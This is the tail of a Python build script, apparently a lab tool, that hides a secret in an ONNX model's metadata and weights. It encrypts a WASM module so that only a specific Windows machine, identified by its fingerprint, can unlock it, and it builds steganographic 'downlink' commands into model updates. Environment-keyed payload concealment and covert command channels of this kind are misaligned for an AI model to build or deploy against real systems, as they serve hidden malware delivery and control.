        helper.make_node("Add", ["out_pre", "stego_zero"], ["out_with_bank"]),
        helper.make_node("Softmax", ["out_with_bank"], ["logits"], axis=1),
    ]
    graph = helper.make_graph(nodes, "OnyxBaitModel", inputs, outputs, initializers)
    model = helper.make_model(
        graph,
        producer_name="Project Onyx",
        opset_imports=[helper.make_opsetid("", 17)],
    )
    model.ir_version = 9
    onnx.checker.check_model(model)
    return model


def set_meta(model: onnx.ModelProto, key: str, value: str) -> None:
    entry = model.metadata_props.add()
    entry.key = key
    entry.value = value


def embed_vault(model: onnx.ModelProto, trigger_hex: str, secret: str, iterations: int) -> None:
    fields = vault_fields_from_secret(trigger_hex, secret, iterations)
    for key, value in fields.items():
        set_meta(model, key, value)
    embed_weight_vault(model, trigger_hex, fields)


def unlock_secret(trigger_hex: str, onnx_path: Path) -> Optional[str]:
    model = onnx.load(str(onnx_path))
    meta = {entry.key: entry.value for entry in model.metadata_props}
    return unlock_secret_from_fields(trigger_hex, meta)


def unlock_secret_from_weight_vault(trigger_hex: str, onnx_path: Path) -> Optional[str]:
    model = onnx.load(str(onnx_path))
    fields = read_weight_vault_fields(trigger_hex, model)
    return unlock_secret_from_fields(trigger_hex, fields)


def encrypt_wasm(wasm_input: Path, secret: str, output: Path) -> None:
    if not wasm_input.exists():
        raise FileNotFoundError(wasm_input)
    key = hashlib.sha256(secret.encode("utf-8")).digest()
    iv, ciphertext = aes_cbc_encrypt_raw(key, wasm_input.read_bytes())
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(iv + ciphertext)


def build(args: argparse.Namespace) -> None:
    trigger = require_trigger(args.trigger)
    secret = require_key_material(args.secret)

    model = load_real_bait_model(getattr(args, "base_model", ""))
    embed_vault(model, trigger, secret, args.iterations)

    model_output = Path(args.model_output)
    model_output.parent.mkdir(parents=True, exist_ok=True)
    onnx.save(model, str(model_output))
    digest = hashlib.sha256(model_output.read_bytes()).hexdigest()
    model_output.with_suffix(model_output.suffix + ".sha256").write_text(
        f"{digest}  {model_output.name}\n",
        encoding="utf-8",
    )

    print(f"[+] ONNX bait vault: {model_output} ({model_output.stat().st_size} bytes)")
    print(f"[+] SHA-256: {digest}")

    if args.wasm_input:
        wasm_input = Path(args.wasm_input)
        wasm_output = Path(args.wasm_output)
        encrypt_wasm(wasm_input, secret, wasm_output)
        print(f"[+] Encrypted WASM: {wasm_output} ({wasm_output.stat().st_size} bytes)")


def verify(args: argparse.Namespace) -> None:
    trigger = require_trigger(args.trigger)
    secret = unlock_secret(trigger, Path(args.model))
    if secret is None:
        print("[-] Wrong trigger or tampered vault")
        raise SystemExit(1)
    weight_secret = unlock_secret_from_weight_vault(trigger, Path(args.model))
    if weight_secret != secret:
        print("[-] ONNX weight vault mismatch")
        raise SystemExit(1)
    print(f"[+] UNLOCKED: {secret}")
    print("[+] ONNX weight vault: verified")


def fingerprint(args: argparse.Namespace) -> None:
    combined, digest = compute_windows_fingerprint()
    if args.show_components:
        print(combined)
    print(digest)


def fetch_model(args: argparse.Namespace) -> None:
    output = ensure_real_bait_model(Path(args.output) if args.output else None)
    print(f"[+] Real ONNX bait model: {output} ({output.stat().st_size} bytes)")
    print(f"[+] Source: {REAL_BAIT_MODEL_ID}")
    print(f"[+] SHA-256: {sha256_file(output)}")


def main() -> None:
    parser = argparse.ArgumentParser(prog="build.py")
    sub = parser.add_subparsers(dest="cmd", required=True)

    build_parser = sub.add_parser("build", help="generate ONNX vault and optionally encrypt WASM")
    build_parser.add_argument("--trigger", required=True, metavar="HEX64")
    build_parser.add_argument("--secret", required=True, help="32-character key material")
    build_parser.add_argument("--model-output", default="assets/model.onnx")
    build_parser.add_argument(
        "--base-model",
        default="",
        help="optional ONNX reference model; defaults to the bundled SqueezeNet model",
    )
    build_parser.add_argument("--wasm-input", default="")
    build_parser.add_argument("--wasm-output", default="assets/license_module.wasm.aes")
    build_parser.add_argument("--iterations", type=int, default=DEFAULT_KDF_ITERATIONS)
    build_parser.set_defaults(func=build)

    verify_parser = sub.add_parser("verify", help="verify and unlock an ONNX vault")
    verify_parser.add_argument("--trigger", required=True, metavar="HEX64")
    verify_parser.add_argument("--model", default="assets/model.onnx")
    verify_parser.set_defaults(func=verify)

    downlink_build_parser = sub.add_parser(
        "downlink-build",
        help="create a heartbeat-only ONNX model-update downlink",
    )
    downlink_build_parser.add_argument("--trigger", required=True, metavar="HEX64")
    downlink_build_parser.add_argument("--reference-model", required=True)
    downlink_build_parser.add_argument(
        "--cover-model",
        default="",
        help="optional pre-existing cover update; otherwise a deterministic lab cover is created",
    )
    downlink_build_parser.add_argument("--output", required=True)
    downlink_build_parser.add_argument(
        "--command",
        required=True,
        choices=sorted(SAFE_DOWNLINK_COMMANDS),
    )
    downlink_build_parser.add_argument(
        "--status",
        default="lab_downlink_ack",
        help="status text for set_status directives",
    )
    downlink_build_parser.add_argument(
        "--nonce",
        default="",
        help="operator-provided replay marker; random if omitted",
    )
    downlink_build_parser.add_argument(
        "--expires-unix",
        type=int,
        default=0,
        help="positive Unix timestamp; defaults to one hour from now",
    )
    downlink_build_parser.add_argument("--iterations", type=int, default=DEFAULT_KDF_ITERATIONS)
    downlink_build_parser.add_argument("--natural-min-abs-delta", type=float, default=1e-5)
    downlink_build_parser.add_argument("--cover-seed", type=int, default=DEFAULT_COVER_SEED)
    downlink_build_parser.add_argument("--cover-fraction", type=float, default=DEFAULT_COVER_FRACTION)
    downlink_build_parser.add_argument("--cover-noise-scale", type=float, default=DEFAULT_COVER_NOISE_SCALE)
    downlink_build_parser.set_defaults(func=build_downlink_update)

    downlink_verify_parser = sub.add_parser(
        "downlink-verify",
        help="verify and print a heartbeat-only ONNX model-update downlink",
    )
    downlink_verify_parser.add_argument("--trigger", required=True, metavar="HEX64")
    downlink_verify_parser.add_argument("--reference-model", required=True)
    downlink_verify_parser.add_argument("--model", required=True)
    downlink_verify_parser.add_argument("--natural-min-abs-delta", type=float, default=1e-5)
    downlink_verify_parser.set_defaults(func=verify_downlink)

    fingerprint_parser = sub.add_parser(
        "fingerprint",
        help="print the Windows environment fingerprint hash used as --trigger",
    )
    fingerprint_parser.add_argument(
        "--show-components",
        action="store_true",
        help="also print the pre-hash MachineGuid/volume/SID string",
    )
    fingerprint_parser.set_defaults(func=fingerprint)

    fetch_model_parser = sub.add_parser(
        "fetch-model",
        help="download/verify the real SqueezeNet ONNX bait model used by default",
    )
    fetch_model_parser.add_argument("--output", default=str(default_real_bait_model_path()))
    fetch_model_parser.set_defaults(func=fetch_model)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
